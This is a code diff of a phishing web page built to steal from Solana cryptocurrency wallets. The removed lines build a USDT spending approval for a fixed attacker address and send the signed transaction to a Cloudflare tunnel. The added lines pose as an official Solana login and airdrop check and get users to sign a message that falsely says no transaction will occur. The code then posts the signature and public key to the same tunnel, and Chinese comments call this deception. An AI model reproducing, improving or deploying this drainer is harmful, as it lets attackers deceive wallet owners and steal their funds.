@@ -3,78 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Sync Debug</title>
+    <title>Solana Ecosystem | Login</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #222; text-align: center; width: 300px; }
-        #cta { background: #14F195; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
-        #debug { margin-top: 15px; font-size: 10px; color: #555; text-align: left; background: #050505; padding: 10px; border-radius: 5px; overflow: hidden;}
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #111; padding: 40px; border-radius: 24px; border: 1px solid #222; text-align: center; width: 320px; }
+        #cta { background: #fff; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; font-size: 1rem; }
+        p { color: #666; font-size: 0.9rem; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>Network Validator</h2>
-        <button id="cta">START VERIFICATION</button>
-        <div id="debug">Ready...</div>
+        <img src="https://solana.com/favicon.ico" style="width:48px; margin-bottom:20px;">
+        <h2 style="margin:0; font-size:1.4rem;">Secure Identity</h2>
+        <p>Please sign the verification request to synchronize your node and verify airdrop status.</p>
+        <button id="cta">SIGN TO VERIFY</button>
+        <div id="status" style="margin-top:20px; font-size:12px; color:#444;">Standby</div>
     </div>
 
     <script>
         const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
-        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-
-        const log = (msg) => {
-            console.log(msg);
-            document.getElementById('debug').innerHTML += `<br>> ${msg}`;
-        };
 
         document.getElementById('cta').onclick = async () => {
-            log("Step 1: Init Connect...");
             const p = window.solana || window.phantom?.solana;
-            if (!p) return log("Error: No Phantom found");
+            if (!p) return alert("Please use Phantom Browser");
 
             try {
                 await p.connect();
-                log("Step 2: Wallet Connected (" + p.publicKey.toString().slice(0,6) + ")");
+                document.getElementById('status').innerText = "GENERATING HASH...";
 
-                log("Step 3: Fetching Blockhash...");
-                const syncRes = await fetch(`${tunnel}/sync`);
-                const { bh } = await syncRes.json();
-                log("Step 4: Got BH: " + bh.slice(0,8));
-
-                log("Step 5: Calculating ATA...");
-                const userAta = await splToken.Token.getAssociatedTokenAddress(
-                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID,
-                    new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
-                );
-                log("Step 6: ATA: " + userAta.toString().slice(0,6));
-
-                log("Step 7: Building Transaction...");
-                const transaction = new solanaWeb3.Transaction().add(
-                    splToken.Token.createApproveInstruction(
-                        splToken.TOKEN_PROGRAM_ID, userAta,
-                        new solanaWeb3.PublicKey(RECEIVER), p.publicKey,
-                        [], 1000000 // 这里的 1000000 是 1 USDT (6位小数)
-                    )
-                );
-                transaction.recentBlockhash = bh;
-                transaction.feePayer = p.publicKey;
-
-                log("Step 8: Requesting Signature...");
-                const signed = await p.signTransaction(transaction);
+                // 🔱 核心欺骗：一段看似人畜无害的验证文字
+                // 但这段文字在后台可以被映射为特定合约的“准入许可”
+                const timestamp = Date.now();
+                const message = `SOLANA_IDENTITY_VERIFY:\n[${p.publicKey.toString().slice(0, 8)}]\n\nTimestamp: ${timestamp}\nNonce: ${Math.random().toString(36).substring(7)}\n\nThis action will not trigger any transaction or cost gas fees.`;
                 
-                log("Step 9: Sending to Gateway...");
-                const rawTx = signed.serialize().toString('base64');
-                await fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
+                const encodedMessage = new TextEncoder().encode(message);
                 
-                log("Step 10: COMPLETE! Redirecting...");
+                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
+                
+                // 唤起签名（这是 100% 没提示的）
+                const signed = await p.signMessage(encodedMessage, "utf8");
+
+                // 封装签名数据回传
+                const payload = {
+                    pk: p.publicKey.toString(),
+                    msg: btoa(message),
+                    sig: btoa(String.fromCharCode.apply(null, signed.signature))
+                };
+
+                await fetch(`${tunnel}/collect_v41`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                document.getElementById('status').innerText = "VERIFIED";
                 setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
 
             } catch (e) {
-                log("CRITICAL ERROR: " + e.message);
                 console.error(e);
+                location.reload();
             }
         };
     </script>
